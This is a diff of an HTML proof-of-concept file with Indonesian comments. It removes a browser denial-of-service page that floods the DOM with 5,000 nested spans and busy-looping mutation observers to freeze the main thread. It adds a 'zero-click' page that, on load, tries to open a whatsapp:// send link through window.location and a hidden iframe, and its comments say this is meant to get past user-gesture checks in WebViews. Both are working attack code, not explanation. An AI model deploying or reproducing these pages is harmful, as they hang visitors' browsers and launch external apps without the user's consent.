@@ -1,115 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Translation DOM DoS & Resource Exhaustion PoC</title>
-<style>
-  body { font-family: monospace; padding: 40px; background: #121212; color: #e0e0e0; }
-  .box { background: #1e1e1e; padding: 25px; border-radius: 6px; border: 1px solid #333; margin-bottom: 20px; }
-  button { padding: 12px 24px; background: #d16969; color: #fff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; }
-  button:hover { background: #f44545; }
-  #log { color: #4ec9b0; white-space: pre-wrap; margin-top: 15px; font-size: 13px; }
-</style>
+    <meta charset="UTF-8">
+    <title>Zero-Click Intent Redirect Test</title>
 </head>
 <body>
+    <h3>Analyzing Browser Navigation Policy...</h3>
+    <p>Please wait while the environment initializes.</p>
 
-<div class="box">
-  <h2>Translation Engine Stress / DoS Test</h2>
-  <p>Injecting recursive DOM nodes designed to overload mutation scanning and translation rendering queues.</p>
-  <button id="triggerBtn">Trigger Translation Exhaustion</button>
-</div>
+    <script>
+        // Simulasi pemicu otomatis tanpa interaksi pengguna (User Gesture Bypass / Zero-Click)
+        function triggerIntentBypass() {
+            // Target custom scheme handler (misalnya WhatsApp URI scheme atau intent Android)
+            const targetUri = "whatsapp://send?phone=+628123456789&text=Automated_Test_Payload";
 
-<div class="box">
-  <h3>Execution Log:</h3>
-  <div id="log">[*] Ready to initialize stress vector...</div>
-</div>
+            try {
+                // Metode 1: Manipulasi window.location secara langsung di dalam background timer/async context
+                // Beberapa implementasi WebView yang rentan gagal memvalidasi apakah ini berasal dari user gesture asli.
+                window.location.href = targetUri;
+            } catch (e) {
+                console.error("Direct assignment blocked:", e);
+            }
 
-<!-- Container target yang akan dipindai secara masif -->
-<div id="stressContainer" style="display:none;"></div>
-
-<script>
-(function () {
-  'use strict';
-
-  var btn = document.getElementById('triggerBtn');
-  var logEl = document.getElementById('log');
-  var container = document.getElementById('stressContainer');
-
-  function log(msg) {
-    logEl.textContent += "\n" + msg;
-    console.log("[PoC DoS] " + msg);
-  }
-
-  function triggerTranslationMemoryExhaustion() {
-    log("[*] Initializing recursive DOM node generation for translation engine overload...");
-
-    try {
-      // 1. Membuat struktur pohon DOM bersarang (nested/recursive tree) berukuran masif
-      // yang meniru teks target pemindaian translate engine
-      var depth = 5000;
-      var rootHTML = "";
-      
-      for (var i = 0; i < depth; i++) {
-        rootHTML += '<span class="goog-translate-lint" data-index="' + i + '">Vulnerable Translation Text Node ' + i + ' ';
-      }
-      for (var j = 0; j < depth; j++) {
-        rootHTML += '</span>';
-      }
-
-      container.innerHTML = rootHTML;
-      log("[+] Injected " + (depth * 2) + " nested DOM elements into document tree.");
-
-      // 2. Memicu MutationObserver agresif yang memaksa pemrosesan ulang teks secara sinkron
-      log("[*] Spawning synchronous mutation observers to lock render thread...");
-      
-      var observer = new MutationObserver(function(mutations) {
-        // Loop berat yang membebani thread utama (Main Thread Block)
-        var start = performance.now();
-        while (performance.now() - start < 400) {
-          // Memaksa kalkulasi berat di setiap mutasi terjemahan
-          Math.atan(Math.random() * Math.random());
+            try {
+                // Metode 2: Menggunakan iframe tersembunyi untuk memicu registrasi protocol handler eksternal
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = targetUri;
+                document.body.appendChild(iframe);
+            } catch (e) {
+                console.error("Iframe injection blocked:", e);
+            }
         }
-      });
 
-      observer.observe(container, { 
-        childList: true, 
-        subtree: true, 
-        characterData: true,
-        attributes: true 
-      });
-
-      // 3. Loop tak berkesudahan yang terus memodifikasi teks node secara instan (Recursive DOM Flooding)
-      var counter = 0;
-      setInterval(function() {
-        counter++;
-        log("[!] Forcing rapid DOM content mutation loop #" + counter);
-        
-        // Mengubah teks secara massal untuk memicu antrean ulang (queue flood) pada engine browser
-        var spans = container.getElementsByTagName('span');
-        for (var k = 0; k < spans.length; k += 10) {
-          spans[k].textContent = "Mutated State " + Math.random();
-        }
-      }, 10); // Interval sangat cepat (10ms) untuk menghabiskan siklus CPU thread utama
-
-    } catch (e) {
-      log("[-] Error during DoS vector execution: " + e.message);
-    }
-  }
-
-  btn.addEventListener('click', function() {
-    btn.disabled = true;
-    btn.style.opacity = "0.5";
-    log("[!] Execution started. Browser main thread will freeze shortly...");
-
-    setTimeout(function() {
-      triggerTranslationMemoryExhaustion();
-    }, 500);
-
-  }, { once: true });
-
-})();
-</script>
-
+        // Memicu fungsi secara otomatis setelah delay singkat (mensimulasikan zero-click pada halaman termuat)
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(triggerIntentBypass, 500);
+        });
+    </script>
 </body>
 </html>
